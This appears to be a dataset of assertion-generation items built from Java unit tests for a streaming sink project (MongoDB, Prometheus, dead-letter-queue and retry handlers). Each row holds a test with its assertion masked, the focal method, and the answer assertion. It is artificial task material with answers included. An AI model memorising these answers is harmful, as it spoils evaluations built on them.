"shouldReturnTrueForUpdateOnlyMode() { MongoUpdateRequestHandler mongoUpdateRequestHandler = new MongoUpdateRequestHandler(MongoSinkMessageType.PROTOBUF, jsonSerializer, MongoSinkRequestType.UPDATE_ONLY, ""customer_id"", ""message"");  ""<AssertPlaceHolder>""; }
canCreate() { return mongoSinkRequestType == MongoSinkRequestType.UPDATE_ONLY; }"	assertTrue(mongoUpdateRequestHandler.canCreate())
"shouldReturnFalseForInsertOrUpdateMode() { MongoUpdateRequestHandler mongoUpdateRequestHandler = new MongoUpdateRequestHandler(MongoSinkMessageType.PROTOBUF, jsonSerializer, MongoSinkRequestType.UPSERT, ""customer_id"", ""message"");  ""<AssertPlaceHolder>""; }
canCreate() { return mongoSinkRequestType == MongoSinkRequestType.UPDATE_ONLY; }"	assertFalse(mongoUpdateRequestHandler.canCreate())
"shouldReturnReplaceOneModelForJsonMessageType() { MongoUpdateRequestHandler mongoUpdateRequestHandler = new MongoUpdateRequestHandler(MongoSinkMessageType.JSON, jsonSerializer, MongoSinkRequestType.UPDATE_ONLY, ""customer_id"", ""message"");  ""<AssertPlaceHolder>""; }
getRequest(Message message) { String logMessage = extractPayload(message); JSONObject logMessageJSONObject = getJSONObject(logMessage); String primaryKeyValue;  primaryKeyValue = getFieldFromJSON(logMessageJSONObject, mongoPrimaryKey); Document document = new Document(""_id"", primaryKeyValue); document.putAll(logMessageJSONObject);  return new ReplaceOneModel<>(new Document(""_id"", primaryKeyValue), document); }"	assertEquals(ReplaceOneModel.class, mongoUpdateRequestHandler.getRequest(messageWithJSON).getClass())
"shouldReturnReplaceOneModelForProtoMessageType() { MongoUpdateRequestHandler mongoUpdateRequestHandler = new MongoUpdateRequestHandler(MongoSinkMessageType.PROTOBUF, jsonSerializer, MongoSinkRequestType.UPDATE_ONLY, ""s2_id_level"", ""message"");  ""<AssertPlaceHolder>""; }
getRequest(Message message) { String logMessage = extractPayload(message); JSONObject logMessageJSONObject = getJSONObject(logMessage); String primaryKeyValue;  primaryKeyValue = getFieldFromJSON(logMessageJSONObject, mongoPrimaryKey); Document document = new Document(""_id"", primaryKeyValue); document.putAll(logMessageJSONObject);  return new ReplaceOneModel<>(new Document(""_id"", primaryKeyValue), document); }"	assertEquals(ReplaceOneModel.class, mongoUpdateRequestHandler.getRequest(messageWithProto).getClass())
"shouldReturnTrueForUpsertMode() { MongoUpsertRequestHandler mongoUpsertRequestHandler = new MongoUpsertRequestHandler(MongoSinkMessageType.PROTOBUF, jsonSerializer, MongoSinkRequestType.UPSERT, ""customer_id"", ""message"");  ""<AssertPlaceHolder>""; }
canCreate() { return mongoSinkRequestType == MongoSinkRequestType.UPSERT; }"	assertTrue(mongoUpsertRequestHandler.canCreate())
"shouldReturnFalseForUpdateOnlyMode() { MongoUpsertRequestHandler mongoUpsertRequestHandler = new MongoUpsertRequestHandler(MongoSinkMessageType.PROTOBUF, jsonSerializer, MongoSinkRequestType.UPDATE_ONLY, ""customer_id"", ""message"");  ""<AssertPlaceHolder>""; }
canCreate() { return mongoSinkRequestType == MongoSinkRequestType.UPSERT; }"	assertFalse(mongoUpsertRequestHandler.canCreate())
"shouldReturnReplaceOneModelForJsonMessageType() { MongoUpsertRequestHandler mongoUpsertRequestHandler = new MongoUpsertRequestHandler(MongoSinkMessageType.JSON, jsonSerializer, MongoSinkRequestType.UPSERT, ""customer_id"", ""message"");  ""<AssertPlaceHolder>""; }
getRequest(Message message) { String logMessage = extractPayload(message); JSONObject logMessageJSONObject = getJSONObject(logMessage);  Document document; if (mongoPrimaryKey == null) { document = new Document(logMessageJSONObject); return new InsertOneModel<>(document); } String primaryKeyValue = getFieldFromJSON(logMessageJSONObject, mongoPrimaryKey); document = new Document(""_id"", primaryKeyValue); document.putAll(logMessageJSONObject);  return new ReplaceOneModel<>( new Document(""_id"", primaryKeyValue), document, new ReplaceOptions().upsert(true)); }"	assertEquals(ReplaceOneModel.class, mongoUpsertRequestHandler.getRequest(messageWithJSON).getClass())
"shouldReturnReplaceOneModelForProtoMessageType() { MongoUpsertRequestHandler mongoUpsertRequestHandler = new MongoUpsertRequestHandler(MongoSinkMessageType.PROTOBUF, jsonSerializer, MongoSinkRequestType.UPSERT, ""s2_id_level"", ""message"");  ""<AssertPlaceHolder>""; }
getRequest(Message message) { String logMessage = extractPayload(message); JSONObject logMessageJSONObject = getJSONObject(logMessage);  Document document; if (mongoPrimaryKey == null) { document = new Document(logMessageJSONObject); return new InsertOneModel<>(document); } String primaryKeyValue = getFieldFromJSON(logMessageJSONObject, mongoPrimaryKey); document = new Document(""_id"", primaryKeyValue); document.putAll(logMessageJSONObject);  return new ReplaceOneModel<>( new Document(""_id"", primaryKeyValue), document, new ReplaceOptions().upsert(true)); }"	assertEquals(ReplaceOneModel.class, mongoUpsertRequestHandler.getRequest(messageWithProto).getClass())
"shouldReturnInsertOneModelForNullPrimaryKey() { MongoUpsertRequestHandler mongoUpsertRequestHandler = new MongoUpsertRequestHandler(MongoSinkMessageType.PROTOBUF, jsonSerializer, MongoSinkRequestType.UPSERT, null, ""message"");  ""<AssertPlaceHolder>""; }
getRequest(Message message) { String logMessage = extractPayload(message); JSONObject logMessageJSONObject = getJSONObject(logMessage);  Document document; if (mongoPrimaryKey == null) { document = new Document(logMessageJSONObject); return new InsertOneModel<>(document); } String primaryKeyValue = getFieldFromJSON(logMessageJSONObject, mongoPrimaryKey); document = new Document(""_id"", primaryKeyValue); document.putAll(logMessageJSONObject);  return new ReplaceOneModel<>( new Document(""_id"", primaryKeyValue), document, new ReplaceOptions().upsert(true)); }"	assertEquals(InsertOneModel.class, mongoUpsertRequestHandler.getRequest(messageWithProto).getClass())
"DeserializerException {  Map<String, String> configuration = new HashMap<>(); configuration.put(""SINK_PROM_SERVICE_URL"", ""dummyEndpoint""); AbstractSink sink = PromSinkFactory.create(configuration, statsDReporter, stencilClient);  ""<AssertPlaceHolder>""; }
create(Map<String, String> configuration, StatsDReporter statsDReporter, StencilClient stencilClient) { PromSinkConfig promSinkConfig = ConfigFactory.create(PromSinkConfig.class, configuration); String promSchemaProtoClass = promSinkConfig.getInputSchemaProtoClass();  FirehoseInstrumentation firehoseInstrumentation = new FirehoseInstrumentation(statsDReporter, PromSinkFactory.class);  CloseableHttpClient closeableHttpClient = newHttpClient(promSinkConfig); firehoseInstrumentation.logInfo(""HTTP connection established"");  Parser protoParser = stencilClient.getParser(promSchemaProtoClass);  PromRequest request = new PromRequestCreator(statsDReporter, promSinkConfig, protoParser).createRequest();  return new PromSink(new FirehoseInstrumentation(statsDReporter, PromSink.class), request, closeableHttpClient, stencilClient, promSinkConfig.getSinkPromRetryStatusCodeRanges(), promSinkConfig.getSinkPromRequestLogStatusCodeRanges() ); }"	assertEquals(PromSink.class, sink.getClass())
"Exception { String body = ""[timeseries {\n  labels {\n    name: ""__name__""\n    value: ""test_metric""\n  }\n  samples {\n    value: 10.0\n    timestamp_ms: 1000000\n  }\n}\n]""; InputStream inputStream = new ByteArrayInputStream(Snappy.compress(writeRequest.toByteArray())); when(httpPost.getEntity()).thenReturn(httpEntity); when(httpEntity.getContent()).thenReturn(inputStream);  PromSink promSink = new PromSink(firehoseInstrumentation, request, httpClient, stencilClient, retryStatusCodeRange, requestLogStatusCodeRanges);  List<String> requestBody = promSink.readContent(httpPost); ""<AssertPlaceHolder>""; }
readContent(HttpEntityEnclosingRequestBase httpRequest) throws IOException { try (InputStream inputStream = httpRequest.getEntity().getContent()) { byte[] byteArrayIs = IOUtils.toByteArray(inputStream); byte[] uncompressedSnappy = Snappy.uncompress(byteArrayIs); String requestBody = DynamicMessage.parseFrom(Cortex.WriteRequest.getDescriptor(), uncompressedSnappy).toString(); return Arrays.asList(requestBody.split(""\\s(?=timeseries)"")); } }"	assertEquals(body, requestBody.toString())
"InterruptedException { Properties promConfigProps = new Properties(); promConfigProps.setProperty(""SINK_PROM_PROTO_EVENT_TIMESTAMP_INDEX"", ""2""); promConfigProps.setProperty(""INPUT_SCHEMA_PROTO_CLASS"", TestFeedbackLogMessage.class.getName()); promConfigProps.setProperty(""SINK_PROM_WITH_EVENT_TIMESTAMP"", ""false""); promConfigProps.setProperty(""SINK_PROM_METRIC_NAME_PROTO_INDEX_MAPPING"", ""{ ""1"": ""order_number"" }""); promConfigProps.setProperty(""SINK_PROM_LABEL_NAME_PROTO_INDEX_MAPPING"", ""{ ""3"": ""driver_id"" }"");  TestFeedbackLogMessage testFeedbackLogMessage = TestFeedbackLogMessage.newBuilder() .setOrderNumber(""100"") .setDriverId(""DRIVER"") .setEventTimestamp(Timestamp.newBuilder().setSeconds(1000)) .build(); DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestFeedbackLogMessage.getDescriptor(), testFeedbackLogMessage.toByteArray());  PromSinkConfig promSinkConfig = ConfigFactory.create(PromSinkConfig.class, promConfigProps);  long beforeTime = System.currentTimeMillis(); Thread.sleep(2); List<Cortex.TimeSeries> timeSeries = new TimeSeriesBuilder(promSinkConfig).buildTimeSeries(dynamicMessage, 2); long afterTime = System.currentTimeMillis(); long seriesTime = timeSeries.get(0).getSamples(0).getTimestampMs(); ""<AssertPlaceHolder>""; }
buildTimeSeries(Message message, int partition) throws InvalidProtocolBufferException { checkValidity(); Cortex.TimeSeries.Builder cortexTimeSeriesBuilder = Cortex.TimeSeries.newBuilder(); Cortex.LabelPair.Builder cortexLabelBuilder = Cortex.LabelPair.newBuilder(); Cortex.Sample.Builder cortexSampleBuilder = Cortex.Sample.newBuilder();  Set<PrometheusLabel> labels = TimeSeriesBuilderUtils.getLabelsFromMessage(message, labelNameProtoIndexMapping, partition); Set<PrometheusMetric> metrics = TimeSeriesBuilderUtils.getMetricsFromMessage(message, metricNameProtoIndexMapping); Long metricTimestamp = TimeSeriesBuilderUtils.getMetricTimestamp(message, isEventTimestampEnabled, timestampIndex); return metrics.stream().map(metric -> { cortexTimeSeriesBuilder.clear(); cortexTimeSeriesBuilder.addLabels(buildMetric(metric.getName(), cortexLabelBuilder)); cortexTimeSeriesBuilder.addSamples(buildSample(metricTimestamp, metric.getValue(), cortexSampleBuilder)); labels.forEach((label) -> cortexTimeSeriesBuilder.addLabels(buildLabels(label.getName(), label.getValue(), cortexLabelBuilder))); return cortexTimeSeriesBuilder.build(); }).collect(Collectors.toList()); }"	assertTrue(seriesTime > beforeTime && seriesTime <= afterTime)
"InvalidProtocolBufferException { Cortex.TimeSeries timeSeries = Cortex.TimeSeries.newBuilder() .addLabels(labelPair1).addSamples(sample1) .addLabels(labelPair2) .build();  Mockito.when(timeSeriesBuilder.buildTimeSeries(dynamicMessage1, message1.getPartition())).thenReturn(Collections.singletonList(timeSeries)); Mockito.when(protoParser.parse(message1.getLogMessage())).thenReturn(dynamicMessage1);  Cortex.WriteRequest writeRequest = new WriteRequestBuilder(timeSeriesBuilder, protoParser) .buildWriteRequest(Collections.singletonList(message1));  String expected = ""timeseries {\n  labels {\n    name: ""__name__""\n    value: ""tip_amount""\n  }\n  labels {\n    name: ""kafka_partition""\n    value: ""0""\n  }\n  samples {\n    value: 100.0\n    timestamp_ms: 10000\n  }\n}\n""; ""<AssertPlaceHolder>""; }
buildWriteRequest(List<Message> messages) throws InvalidProtocolBufferException { writeRequestBuilder.clear(); List<Cortex.TimeSeries> sortedTimeSeriesList = new ArrayList<>(); for (Message message : messages) { DynamicMessage protoMessage = protoParser.parse(message.getLogMessage()); int partition = message.getPartition(); sortedTimeSeriesList.addAll(timeSeriesBuilder.buildTimeSeries(protoMessage, partition)); } sortedTimeSeriesList.sort(Comparator.comparing(o -> o.getSamplesList().get(0).getTimestampMs())); writeRequestBuilder.addAllTimeseries(sortedTimeSeriesList); return writeRequestBuilder.build(); }"	assertEquals(expected, writeRequest.toString())
"InvalidProtocolBufferException { Cortex.TimeSeries timeSeries1 = Cortex.TimeSeries.newBuilder() .addLabels(labelPair1).addSamples(sample1) .addLabels(labelPair2) .build(); Cortex.TimeSeries timeSeries2 = Cortex.TimeSeries.newBuilder() .addLabels(labelPair1).addSamples(sample2) .addLabels(labelPair3) .build();  Mockito.when(timeSeriesBuilder.buildTimeSeries(dynamicMessage1, message1.getPartition())).thenReturn(Collections.singletonList(timeSeries1)); Mockito.when(protoParser.parse(message1.getLogMessage())).thenReturn(dynamicMessage1); Mockito.when(timeSeriesBuilder.buildTimeSeries(dynamicMessage2, message2.getPartition())).thenReturn(Collections.singletonList(timeSeries2)); Mockito.when(protoParser.parse(message2.getLogMessage())).thenReturn(dynamicMessage2);  Cortex.WriteRequest writeRequest = new WriteRequestBuilder(timeSeriesBuilder, protoParser) .buildWriteRequest(messages);  String expected = ""timeseries {\n  labels {\n    name: ""__name__""\n    value: ""tip_amount""\n  }\n  labels {\n    name: ""kafka_partition""\n    value: ""1""\n  }\n  samples {\n    value: 200.0\n    timestamp_ms: 8000\n  }\n}\n"" + ""timeseries {\n  labels {\n    name: ""__name__""\n    value: ""tip_amount""\n  }\n  labels {\n    name: ""kafka_partition""\n    value: ""0""\n  }\n  samples {\n    value: 100.0\n    timestamp_ms: 10000\n  }\n}\n""; ""<AssertPlaceHolder>""; }
buildWriteRequest(List<Message> messages) throws InvalidProtocolBufferException { writeRequestBuilder.clear(); List<Cortex.TimeSeries> sortedTimeSeriesList = new ArrayList<>(); for (Message message : messages) { DynamicMessage protoMessage = protoParser.parse(message.getLogMessage()); int partition = message.getPartition(); sortedTimeSeriesList.addAll(timeSeriesBuilder.buildTimeSeries(protoMessage, partition)); } sortedTimeSeriesList.sort(Comparator.comparing(o -> o.getSamplesList().get(0).getTimestampMs())); writeRequestBuilder.addAllTimeseries(sortedTimeSeriesList); return writeRequestBuilder.build(); }"	assertEquals(expected, writeRequest.toString())
"InvalidProtocolBufferException { Cortex.WriteRequest writeRequest = new WriteRequestBuilder(timeSeriesBuilder, protoParser) .buildWriteRequest(new ArrayList<>()); ""<AssertPlaceHolder>""; }
buildWriteRequest(List<Message> messages) throws InvalidProtocolBufferException { writeRequestBuilder.clear(); List<Cortex.TimeSeries> sortedTimeSeriesList = new ArrayList<>(); for (Message message : messages) { DynamicMessage protoMessage = protoParser.parse(message.getLogMessage()); int partition = message.getPartition(); sortedTimeSeriesList.addAll(timeSeriesBuilder.buildTimeSeries(protoMessage, partition)); } sortedTimeSeriesList.sort(Comparator.comparing(o -> o.getSamplesList().get(0).getTimestampMs())); writeRequestBuilder.addAllTimeseries(sortedTimeSeriesList); return writeRequestBuilder.build(); }"	assertTrue(writeRequest.toString().isEmpty())
"shouldCreateNotNullRequest() {  Properties promConfigProps = new Properties();  PromSinkConfig promSinkConfig = ConfigFactory.create(PromSinkConfig.class, promConfigProps); PromRequestCreator promRequestCreator = new PromRequestCreator(statsDReporter, promSinkConfig, protoParser);  PromRequest request = promRequestCreator.createRequest();  ""<AssertPlaceHolder>""; }
createRequest() { WriteRequestBuilder body = createBody(); HeaderBuilder headerBuilder = new HeaderBuilder(promSinkConfig.getSinkPromHeaders()); String baseUrl = promSinkConfig.getSinkPromServiceUrl(); RequestEntityBuilder requestEntityBuilder = new RequestEntityBuilder();  return new PromRequest(new FirehoseInstrumentation(statsDReporter, PromRequest.class), headerBuilder, baseUrl, requestEntityBuilder, body); }"	assertNotNull(request)
"Exception { when(dlqWriter.write(anyList())).thenReturn(new LinkedList<>()); ArrayList<Message> messages = new ArrayList<>(); messages.add(message); messages.add(message); when(message.getErrorInfo()).thenReturn(new ErrorInfo(new RuntimeException(), ErrorType.DESERIALIZATION_ERROR)); when(sinkWithRetry.pushMessage(anyList())).thenReturn(messages);  SinkWithDlq sinkWithDlq = new SinkWithDlq(sinkWithRetry, dlqWriter, backOffProvider, dlqConfig, errorHandler, firehoseInstrumentation);  List<Message> pushResult = sinkWithDlq.pushMessage(messages); verify(dlqWriter, times(1)).write(messages); ""<AssertPlaceHolder>""; verify(firehoseInstrumentation, times(2)).captureMessageMetrics(Metrics.DLQ_MESSAGES_TOTAL, Metrics.MessageType.TOTAL, ErrorType.DESERIALIZATION_ERROR, 1); verify(firehoseInstrumentation, times(1)).captureMessageMetrics(Metrics.DLQ_MESSAGES_TOTAL, Metrics.MessageType.SUCCESS, 2); verify(firehoseInstrumentation, times(1)).incrementCounter(Metrics.DLQ_RETRY_ATTEMPTS_TOTAL); verify(firehoseInstrumentation, times(1)).captureGlobalMessageMetrics(Metrics.MessageScope.DLQ, 2); }
pushMessage(List<Message> inputMessages) throws IOException, DeserializerException { List<Message> messages = super.pushMessage(inputMessages); if (messages.isEmpty()) { return messages; } Map<Boolean, List<Message>> splitLists = errorHandler.split(messages, ErrorScope.DLQ); List<Message> returnedMessages = doDLQ(splitLists.get(Boolean.TRUE)); if (!returnedMessages.isEmpty() && dlqConfig.getDlqRetryFailAfterMaxAttemptEnable()) { throw new IOException(""exhausted maximum number of allowed retry attempts to write messages to DLQ""); } if (super.canManageOffsets()) { super.addOffsetsAndSetCommittable(messages); } returnedMessages.addAll(splitLists.get(Boolean.FALSE)); return returnedMessages; }"	assertEquals(0, pushResult.size())
"IOException { long timestamp = Instant.parse(""2020-01-01T00:00:00Z"").toEpochMilli(); Message message1 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 1, null, 0, timestamp, new ErrorInfo(new IOException(), ErrorType.DESERIALIZATION_ERROR)); Message message2 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 2, null, 0, timestamp, new ErrorInfo(new IOException(), ErrorType.DESERIALIZATION_ERROR)); Message message3 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 3, null, 0, timestamp, new ErrorInfo(new IOException(), ErrorType.DESERIALIZATION_ERROR));  ArrayList<Message> messages = new ArrayList<>(); messages.add(message1); messages.add(message2); messages.add(message3);  ArrayList<Message> dlqProcessedMessages = new ArrayList<>(); dlqProcessedMessages.add(message2); dlqProcessedMessages.add(message3);  when(sinkWithRetry.canManageOffsets()).thenReturn(true); when(sinkWithRetry.pushMessage(messages)).thenReturn(dlqProcessedMessages); when(dlqWriter.write(anyList())).thenReturn(new LinkedList<>());  SinkWithDlq sinkWithDlq = new SinkWithDlq(sinkWithRetry, dlqWriter, backOffProvider, dlqConfig, errorHandler, firehoseInstrumentation); List<Message> pushResult = sinkWithDlq.pushMessage(messages);  verify(sinkWithRetry, times(1)).addOffsetsAndSetCommittable(dlqProcessedMessages); ""<AssertPlaceHolder>""; }
pushMessage(List<Message> inputMessages) throws IOException, DeserializerException { List<Message> messages = super.pushMessage(inputMessages); if (messages.isEmpty()) { return messages; } Map<Boolean, List<Message>> splitLists = errorHandler.split(messages, ErrorScope.DLQ); List<Message> returnedMessages = doDLQ(splitLists.get(Boolean.TRUE)); if (!returnedMessages.isEmpty() && dlqConfig.getDlqRetryFailAfterMaxAttemptEnable()) { throw new IOException(""exhausted maximum number of allowed retry attempts to write messages to DLQ""); } if (super.canManageOffsets()) { super.addOffsetsAndSetCommittable(messages); } returnedMessages.addAll(splitLists.get(Boolean.FALSE)); return returnedMessages; }"	assertEquals(0, pushResult.size())
"Exception { ArrayList<Message> messages = new ArrayList<>(); messages.add(message); messages.add(message); when(dlqConfig.getDlqRetryFailAfterMaxAttemptEnable()).thenReturn(false); when(message.getErrorInfo()).thenReturn(new ErrorInfo(new RuntimeException(), ErrorType.DESERIALIZATION_ERROR)); when(sinkWithRetry.pushMessage(anyList())).thenReturn(messages); when(dlqWriter.write(anyList())).thenReturn(messages);  SinkWithDlq sinkWithDlq = new SinkWithDlq(sinkWithRetry, dlqWriter, backOffProvider, dlqConfig, errorHandler, firehoseInstrumentation);  List<Message> pushResult = sinkWithDlq.pushMessage(messages); verify(dlqWriter, times(10)).write(messages); ""<AssertPlaceHolder>""; verify(firehoseInstrumentation, times(2)).captureMessageMetrics(Metrics.DLQ_MESSAGES_TOTAL, Metrics.MessageType.TOTAL, ErrorType.DESERIALIZATION_ERROR, 1); verify(firehoseInstrumentation, times(1)).captureMessageMetrics(Metrics.DLQ_MESSAGES_TOTAL, Metrics.MessageType.SUCCESS, 0); verify(firehoseInstrumentation, times(2)).captureMessageMetrics(Metrics.DLQ_MESSAGES_TOTAL, Metrics.MessageType.FAILURE, ErrorType.DESERIALIZATION_ERROR, 1); verify(firehoseInstrumentation, times(10)).incrementCounter(Metrics.DLQ_RETRY_ATTEMPTS_TOTAL); verify(firehoseInstrumentation, times(1)).captureGlobalMessageMetrics(Metrics.MessageScope.DLQ, 0); }
pushMessage(List<Message> inputMessages) throws IOException, DeserializerException { List<Message> messages = super.pushMessage(inputMessages); if (messages.isEmpty()) { return messages; } Map<Boolean, List<Message>> splitLists = errorHandler.split(messages, ErrorScope.DLQ); List<Message> returnedMessages = doDLQ(splitLists.get(Boolean.TRUE)); if (!returnedMessages.isEmpty() && dlqConfig.getDlqRetryFailAfterMaxAttemptEnable()) { throw new IOException(""exhausted maximum number of allowed retry attempts to write messages to DLQ""); } if (super.canManageOffsets()) { super.addOffsetsAndSetCommittable(messages); } returnedMessages.addAll(splitLists.get(Boolean.FALSE)); return returnedMessages; }"	assertEquals(2, pushResult.size())
"IOException { ErrorConfig config = ConfigFactory.create(ErrorConfig.class, new HashMap<String, String>()); config.setProperty(""ERROR_TYPES_FOR_FAILING"", """"); ErrorHandler errorHandler = new ErrorHandler(config);  List<Message> messages = new LinkedList<>(); messages.add(new Message("""".getBytes(), """".getBytes(), ""basic"", 1, 1, null, 0, 0, new ErrorInfo(new RuntimeException(), ErrorType.DESERIALIZATION_ERROR)));  when(sink.pushMessage(anyList())).thenReturn(messages);  SinkWithFailHandler sinkWithFailHandler = new SinkWithFailHandler(sink, errorHandler); Assert.""<AssertPlaceHolder>""; }
pushMessage(List<Message> inputMessages) throws IOException, DeserializerException { List<Message> messages = super.pushMessage(inputMessages); Optional<Message> messageOptional = messages.stream().filter(x -> errorHandler.filter(x, ErrorScope.FAIL)).findFirst(); if (messageOptional.isPresent()) { throw new SinkException(""Failing Firehose for error "" + messageOptional.get().getErrorInfo().getErrorType(), messageOptional.get().getErrorInfo().getException()); } return messages; }"	assertEquals(messages, sinkWithFailHandler.pushMessage(messages))
"DeserializerException { when(appConfig.getRetryMaxAttempts()).thenReturn(10); when(appConfig.getInputSchemaType()).thenReturn(InputSchemaType.PROTOBUF); ArrayList<Message> messages = new ArrayList<>(); messages.add(message); messages.add(message); when(message.getErrorInfo()).thenReturn(new ErrorInfo(null, ErrorType.DESERIALIZATION_ERROR)); when(firehoseInstrumentation.isDebugEnabled()).thenReturn(true); when(sinkDecorator.pushMessage(anyList())).thenReturn(messages).thenReturn(messages).thenReturn(messages) .thenReturn(messages).thenReturn(messages).thenReturn(new ArrayList<>()); SinkWithRetry sinkWithRetry = new SinkWithRetry(sinkDecorator, backOffProvider, firehoseInstrumentation, appConfig, parser, errorHandler);  List<Message> messageList = sinkWithRetry.pushMessage(Collections.singletonList(message)); ""<AssertPlaceHolder>""; verify(firehoseInstrumentation, times(1)).logInfo(""Maximum retry attempts: {}"", 10); verify(firehoseInstrumentation, times(5)).incrementCounter(""firehose_retry_attempts_total""); verify(firehoseInstrumentation, times(1)).logInfo(""Retrying messages attempt count: {}, Number of messages: {}"", 1, 2); verify(firehoseInstrumentation, times(1)).logInfo(""Retrying messages attempt count: {}, Number of messages: {}"", 2, 2); verify(firehoseInstrumentation, times(1)).logInfo(""Retrying messages attempt count: {}, Number of messages: {}"", 3, 2); verify(firehoseInstrumentation, times(1)).logInfo(""Retrying messages attempt count: {}, Number of messages: {}"", 4, 2); verify(firehoseInstrumentation, times(1)).logInfo(""Retrying messages attempt count: {}, Number of messages: {}"", 5, 2); verify(firehoseInstrumentation, times(5)).logDebug(""Retry failed messages: \n{}"", ""[null, null]""); }
pushMessage(List<Message> inputMessages) throws IOException, DeserializerException { List<Message> failedMessages = super.pushMessage(inputMessages); if (failedMessages.isEmpty()) { return failedMessages; } Map<Boolean, List<Message>> splitLists = errorHandler.split(failedMessages, ErrorScope.RETRY); List<Message> messagesAfterRetry = doRetry(splitLists.get(Boolean.TRUE)); if (!messagesAfterRetry.isEmpty() && appConfig.getRetryFailAfterMaxAttemptsEnable()) { throw new IOException(""exceeded maximum Sink retry attempts""); } messagesAfterRetry.addAll(splitLists.get(Boolean.FALSE)); return messagesAfterRetry; }"	assertTrue(messageList.isEmpty())
"DeserializerException { when(appConfig.getRetryMaxAttempts()).thenReturn(10); when(appConfig.getInputSchemaType()).thenReturn(InputSchemaType.JSON); when(appConfig.getKafkaRecordParserMode()).thenReturn(""message""); when(message.getLogMessage()).thenReturn(""testing message"".getBytes()); ArrayList<Message> messages = new ArrayList<>(); messages.add(message); messages.add(message); when(message.getErrorInfo()).thenReturn(new ErrorInfo(null, ErrorType.DESERIALIZATION_ERROR)); when(firehoseInstrumentation.isDebugEnabled()).thenReturn(true); when(sinkDecorator.pushMessage(anyList())).thenReturn(messages).thenReturn(messages).thenReturn(messages) .thenReturn(messages).thenReturn(messages).thenReturn(new ArrayList<>()); SinkWithRetry sinkWithRetry = new SinkWithRetry(sinkDecorator, backOffProvider, firehoseInstrumentation, appConfig, parser, errorHandler);  List<Message> messageList = sinkWithRetry.pushMessage(Collections.singletonList(message)); ""<AssertPlaceHolder>""; verify(firehoseInstrumentation, times(1)).logInfo(""Maximum retry attempts: {}"", 10); verify(firehoseInstrumentation, times(5)).incrementCounter(""firehose_retry_attempts_total""); verify(firehoseInstrumentation, times(1)).logInfo(""Retrying messages attempt count: {}, Number of messages: {}"", 1, 2); verify(firehoseInstrumentation, times(1)).logInfo(""Retrying messages attempt count: {}, Number of messages: {}"", 2, 2); verify(firehoseInstrumentation, times(1)).logInfo(""Retrying messages attempt count: {}, Number of messages: {}"", 3, 2); verify(firehoseInstrumentation, times(1)).logInfo(""Retrying messages attempt count: {}, Number of messages: {}"", 4, 2); verify(firehoseInstrumentation, times(1)).logInfo(""Retrying messages attempt count: {}, Number of messages: {}"", 5, 2); verify(firehoseInstrumentation, times(5)).logDebug(""Retry failed messages: \n{}"", ""[testing message, testing message]""); }
pushMessage(List<Message> inputMessages) throws IOException, DeserializerException { List<Message> failedMessages = super.pushMessage(inputMessages); if (failedMessages.isEmpty()) { return failedMessages; } Map<Boolean, List<Message>> splitLists = errorHandler.split(failedMessages, ErrorScope.RETRY); List<Message> messagesAfterRetry = doRetry(splitLists.get(Boolean.TRUE)); if (!messagesAfterRetry.isEmpty() && appConfig.getRetryFailAfterMaxAttemptsEnable()) { throw new IOException(""exceeded maximum Sink retry attempts""); } messagesAfterRetry.addAll(splitLists.get(Boolean.FALSE)); return messagesAfterRetry; }"	assertTrue(messageList.isEmpty())
"Exception { when(appConfig.getRetryMaxAttempts()).thenReturn(3); ArrayList<Message> messages = new ArrayList<>(); messages.add(message); messages.add(message); messages.add(message); when(message.getErrorInfo()).thenReturn(new ErrorInfo(null, ErrorType.DESERIALIZATION_ERROR)); SinkWithRetry sinkWithRetry = new SinkWithRetry(sinkDecorator, backOffProvider, firehoseInstrumentation, appConfig, parser, errorHandler); when(sinkDecorator.pushMessage(anyList())).thenReturn(messages).thenReturn(messages).thenReturn(new ArrayList<>()); List<Message> messageList = sinkWithRetry.pushMessage(Collections.singletonList(message)); ""<AssertPlaceHolder>""; verify(firehoseInstrumentation, times(1)).logInfo(""Maximum retry attempts: {}"", 3); verify(firehoseInstrumentation, times(3)).captureMessageMetrics(Metrics.RETRY_MESSAGES_TOTAL, Metrics.MessageType.TOTAL, ErrorType.DESERIALIZATION_ERROR, 1); verify(firehoseInstrumentation, times(2)).incrementCounter(Metrics.RETRY_ATTEMPTS_TOTAL); verify(firehoseInstrumentation, times(1)).captureMessageMetrics(Metrics.RETRY_MESSAGES_TOTAL, Metrics.MessageType.SUCCESS, 3); }
pushMessage(List<Message> inputMessages) throws IOException, DeserializerException { List<Message> failedMessages = super.pushMessage(inputMessages); if (failedMessages.isEmpty()) { return failedMessages; } Map<Boolean, List<Message>> splitLists = errorHandler.split(failedMessages, ErrorScope.RETRY); List<Message> messagesAfterRetry = doRetry(splitLists.get(Boolean.TRUE)); if (!messagesAfterRetry.isEmpty() && appConfig.getRetryFailAfterMaxAttemptsEnable()) { throw new IOException(""exceeded maximum Sink retry attempts""); } messagesAfterRetry.addAll(splitLists.get(Boolean.FALSE)); return messagesAfterRetry; }"	assertTrue(messageList.isEmpty())
"Exception { when(appConfig.getRetryMaxAttempts()).thenReturn(1); ArrayList<Message> messages = new ArrayList<>(); messages.add(message); messages.add(message); messages.add(message); when(message.getErrorInfo()).thenReturn(new ErrorInfo(null, ErrorType.DESERIALIZATION_ERROR)); SinkWithRetry sinkWithRetry = new SinkWithRetry(sinkDecorator, backOffProvider, firehoseInstrumentation, appConfig, parser, errorHandler); when(sinkDecorator.pushMessage(anyList())).thenReturn(messages).thenReturn(messages).thenReturn(new ArrayList<>()); List<Message> messageList = sinkWithRetry.pushMessage(Collections.singletonList(message)); ""<AssertPlaceHolder>""; verify(firehoseInstrumentation, times(1)).logInfo(""Maximum retry attempts: {}"", 1); verify(firehoseInstrumentation, times(3)).captureMessageMetrics(Metrics.RETRY_MESSAGES_TOTAL, Metrics.MessageType.TOTAL, ErrorType.DESERIALIZATION_ERROR, 1); verify(firehoseInstrumentation, times(1)).incrementCounter(Metrics.RETRY_ATTEMPTS_TOTAL); verify(firehoseInstrumentation, times(1)).captureMessageMetrics(Metrics.RETRY_MESSAGES_TOTAL, Metrics.MessageType.SUCCESS, 0); verify(firehoseInstrumentation, times(3)).captureMessageMetrics(Metrics.RETRY_MESSAGES_TOTAL, Metrics.MessageType.FAILURE, ErrorType.DESERIALIZATION_ERROR, 1); }
